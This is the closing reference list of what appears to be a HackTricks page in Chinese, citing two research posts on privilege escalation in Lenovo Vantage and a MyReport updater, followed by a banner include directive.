- [15] [Atredis – 揭示 Lenovo Vantage 中的权限提升漏洞](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater：从 gRPC 到 SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
